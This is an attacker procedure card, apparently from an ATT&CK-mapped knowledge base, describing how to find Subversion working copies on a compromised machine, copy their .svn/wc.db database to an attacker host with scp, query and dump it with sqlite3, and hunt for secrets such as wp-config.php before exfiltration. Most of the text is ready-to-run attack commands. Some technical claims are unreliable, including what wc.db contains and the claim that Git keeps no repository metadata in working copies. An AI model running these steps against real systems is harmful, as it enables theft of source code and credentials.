---
id: 4229adfa-7bd1-43df-9c64-b1c5d3838bc6
name: Extract-Subversion-Repository-from-Working-Copy-Database
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:00.268276+00:00'
updated_at: '2023-04-10T20:33:57.266501+00:00'
tactics:
  - '[[Collection]]'
techniques:
  - '[[Data from Local System]]'
sub_techniques:
  - '[[T1005.003]]'
tags:
  - subversion
  - source-code-leak
  - insecure-scm
  - example-wordpress
commands:
  - '[[commands/sqlite3-query-svn-nodes]]'
  - '[[commands/sqlite3-dump-svn-repo]]'
platforms:
  - Linux
  - Windows
  - macOS
tools:
  - '[[tools/sqlite3]]'
validated: true
---

# Extract-Subversion-Repository-from-Working-Copy-Database

## Summary

This procedure allows an attacker with access to a victim's machine to extract the contents of a Subversion (SVN) repository by accessing the local working copy's SQLite database file (.svn/wc.db). Even if the remote repository is not publicly exposed, the working copy contains metadata and references that can be queried to reconstruct file paths, revisions, and potentially download or view sensitive source code, configuration files, and other artifacts stored in the repo. This is particularly useful against development environments or web applications like WordPress that use SVN for version control.

## Description

Subversion repositories maintain a local working copy that includes a hidden .svn directory containing the wc.db SQLite database. This database stores information about the repository structure, including node entries for files and directories, their revisions, checksums, and properties. By dumping or querying this database, an attacker can identify and potentially retrieve sensitive data without needing direct repository access. The technique exploits insecure source code management practices where working copies are left accessible on compromised systems. It maps to MITRE ATT&CK technique T1005 (Data from Local System), focusing on extracting application data from local storage. Prerequisites include shell access to the victim's machine and knowledge of the working copy location, often in web roots like /var/www/ for WordPress installations.

## Requirements

1. Shell access to the victim's machine (local or remote via initial access like SSH or RCE).
2. Knowledge of the SVN working copy path (e.g., /path/to/project/.svn).
3. Installed SQLite3 tool on the attacker's machine or victim's for querying (standard on most Unix-like systems).
4. Sufficient permissions to read the .svn/wc.db file.

## Defense

- Restrict access to .svn directories by removing them from production deployments or using .htaccess rules to deny access (e.g., in Apache: <Directory ~ ".svn"> Deny from all </Directory>).
- Use repository managers like Git instead of SVN, which do not store full repo metadata in working copies.
- Implement file integrity monitoring (FIM) to detect unauthorized access to version control directories.
- Encrypt sensitive repo contents and avoid committing secrets to version control.
- Regularly audit and clean working copies on servers.

## Objectives

1. Locate and access the SVN working copy database to identify repository structure.
2. Query the database to extract file paths, revisions, and metadata for sensitive artifacts.
3. Reconstruct or download repository contents for exfiltration, enabling source code theft or configuration analysis.

## Instructions

### Step 1: Locate the SVN Working Copy Directory

**Context**: Identify the path to the project's .svn directory, which contains the wc.db SQLite file. Common locations include web application roots like /var/www/html/ for WordPress or developer workspaces.

Search for .svn directories using file system enumeration.

**Command** ([[commands/find-svn-directories]]):
```bash
find / -type d -name ".svn" 2>/dev/null | head -10
```

> This command searches the file system for .svn directories, limiting output to avoid overwhelming results. Expected output: A list of paths like /var/www/project/.svn. Verify the path contains wc.db: ls /path/to/.svn/wc.db.

### Step 2: Copy the wc.db Database for Analysis

**Context**: Secure the wc.db file to your attacker-controlled machine to avoid detection or tampering. This file is a SQLite database holding the repo's node tree.

Use scp or similar to transfer the file if remote access is available.

**Command** ([[commands/scp-copy-wc-db]]):
```bash
scp user@victim:/path/to/project/.svn/wc.db ./wc.db
```

> Replace user@victim with actual credentials/IP. Expected output: File transferred successfully (no errors). On the local machine, confirm: file wc.db (should show SQLite database).

### Step 3: Query the NODES Table for Repository Structure

**Context**: The NODES table in wc.db contains entries for files and directories, including paths, types, revisions, and checksums. Query it to map out the repo contents and identify sensitive files like config.php or source code.

**Command** ([[commands/sqlite3-query-svn-nodes]]):
```bash
sqlite3 wc.db "SELECT local_relpath, kind, revision, checksum FROM nodes WHERE kind='file' LIMIT 20;"
```

> This extracts file paths, types, revisions, and SHA1 checksums. Expected output: Table with columns like local_relpath (e.g., trunk/wp-config.php), kind (file), revision (e.g., 123), checksum (SHA1 hash). Use this to pinpoint valuable files.

### Step 4: Dump Full Repository Data for Reconstruction

**Context**: To fully reconstruct the repo, dump the entire database or specific tables. This allows offline analysis or scripting to fetch contents using the metadata (e.g., via svn export if URLs are recoverable).

**Command** ([[commands/sqlite3-dump-svn-repo]]):
```bash
sqlite3 wc.db ".dump" > svn_dump.sql
```

> This exports the entire database schema and data. Expected output: SQL file with INSERT statements for all tables, including NODES with detailed repo info. Analyze the dump to extract URLs from REPOSITORY table if present, then use svn commands to pull files: svn export --username <user> --password <pass> <url>.

### Step 5: Verify and Exfiltrate Extracted Data

**Context**: Confirm the extraction by checking for sensitive files (e.g., grep for 'password' in paths) and prepare for exfiltration.

Review the query output or dump for keywords.

> Expected output: Identification of files like .env, config files, or source code. Success if repo structure is visible and usable for further actions like code review or exploit development.
